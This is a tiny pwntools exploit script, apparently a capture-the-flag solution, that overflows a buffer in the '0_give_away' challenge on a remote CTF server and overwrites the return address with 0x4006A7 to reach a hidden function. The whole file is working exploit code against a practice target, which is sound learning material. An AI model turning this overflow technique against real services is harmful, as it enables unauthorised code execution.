#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
#p = process('./0_give_away')
p = remote('sharkyctf.xyz', 20333)
elf = ELF('./0_give_away')

magic=0x4006A7
payload='A'*40+p64(magic)

p.sendline(payload)
p.interactive()

